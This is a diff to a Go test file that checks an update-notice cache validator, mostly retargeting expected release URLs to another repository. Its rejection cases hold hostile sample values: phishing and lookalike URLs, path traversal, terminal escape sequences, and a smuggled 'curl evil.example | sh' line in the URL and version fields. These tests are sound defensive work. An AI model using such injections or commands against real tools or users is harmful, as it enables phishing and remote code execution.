@@ -28,7 +28,7 @@ func TestWriteCache_Permissions(t *testing.T) {
 		CheckedAt:          time.Now(),
 		CheckedFromVersion: "1.0.0",
 		LatestVersion:      "2.0.0",
-		ReleaseURL:         "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0",
+		ReleaseURL:         "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0",
 		UpdateAvailable:    true,
 	})
 
@@ -61,7 +61,7 @@ func TestWriteCache_ReplacesSymlink(t *testing.T) {
 		CheckedAt:          time.Now(),
 		CheckedFromVersion: "1.0.0",
 		LatestVersion:      "2.0.0",
-		ReleaseURL:         "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0",
+		ReleaseURL:         "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0",
 		UpdateAvailable:    true,
 	})
 
@@ -97,7 +97,7 @@ func TestReadCache_RejectsTamperedEntries(t *testing.T) {
 			"checked_at":           time.Now().Format(time.RFC3339),
 			"checked_from_version": "1.0.0",
 			"latest_version":       "2.0.0",
-			"release_url":          "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0",
+			"release_url":          "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0",
 			"update_available":     true,
 		}
 	}
@@ -111,33 +111,33 @@ func TestReadCache_RejectsTamperedEntries(t *testing.T) {
 		{name: "valid entry", mutate: func(map[string]any) {}, want: true},
 		{name: "prerelease version", mutate: func(m map[string]any) {
 			m["latest_version"] = "3.0.0-rc.1"
-			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/tag/v3.0.0-rc.1"
+			m["release_url"] = "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v3.0.0-rc.1"
 		}, want: true},
 		// PoC from the audit: a planted cache entry pointing at a phishing page.
 		{name: "phishing release url", mutate: func(m map[string]any) {
 			m["release_url"] = "https://evil.example/redmine-cli/releases/tag/v2.0.0"
 		}},
 		{name: "lookalike host", mutate: func(m map[string]any) {
-			m["release_url"] = "https://github.com.evil.example/aarondpn/redmine-cli/releases/tag/v2.0.0"
+			m["release_url"] = "https://github.com.evil.example/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0"
 		}},
 		{name: "other repository", mutate: func(m map[string]any) {
 			m["release_url"] = "https://github.com/attacker/redmine-cli/releases/tag/v2.0.0"
 		}},
 		{name: "plain http", mutate: func(m map[string]any) {
-			m["release_url"] = "http://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0"
+			m["release_url"] = "http://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0"
 		}},
 		{name: "terminal escape in url", mutate: func(m map[string]any) {
-			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0\x1b]8;;https://evil.example\x07"
+			m["release_url"] = "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0\x1b]8;;https://evil.example\x07"
 		}},
 		{name: "newline in url", mutate: func(m map[string]any) {
-			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/\nRun: curl evil.example | sh"
+			m["release_url"] = "https://github.com/TruthUnderlier/RedmineFlow/releases/\nRun: curl evil.example | sh"
 		}},
 		// Starts with the releases prefix but resolves to another repository.
 		{name: "dot segments in url", mutate: func(m map[string]any) {
-			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/../../attacker/repo"
+			m["release_url"] = "https://github.com/TruthUnderlier/RedmineFlow/releases/../../attacker/repo"
 		}},
 		{name: "nested path in url", mutate: func(m map[string]any) {
-			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0/../../../../attacker/repo"
+			m["release_url"] = "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0/../../../../attacker/repo"
 		}},
 		{name: "empty url", mutate: func(m map[string]any) { m["release_url"] = "" }},
 		{name: "bogus version", mutate: func(m map[string]any) { m["latest_version"] = "2.0.0\nRun: curl evil.example | sh" }},
@@ -200,7 +200,7 @@ func TestCheckForUpdateCached_PoisonedCacheNotPrinted(t *testing.T) {
 	if strings.Contains(buf.String(), "evil.example") || strings.Contains(buf.String(), "9.9.9") {
 		t.Fatalf("poisoned cache leaked into notice:\n%s", buf.String())
 	}
-	if !strings.Contains(buf.String(), "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0") {
+	if !strings.Contains(buf.String(), "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0") {
 		t.Errorf("expected live release URL in notice, got:\n%s", buf.String())
 	}
 }
@@ -225,7 +225,7 @@ func TestPrintNotice_RejectsUnvalidatedResult(t *testing.T) {
 		result *CheckResult
 	}{
 		{name: "foreign url", result: &CheckResult{NewVersion: "2.0.0", ReleaseURL: "https://evil.example/"}},
-		{name: "escape in version", result: &CheckResult{NewVersion: "2.0.0\x1b[2J", ReleaseURL: "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0"}},
+		{name: "escape in version", result: &CheckResult{NewVersion: "2.0.0\x1b[2J", ReleaseURL: "https://github.com/TruthUnderlier/RedmineFlow/releases/tag/v2.0.0"}},
 	}
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
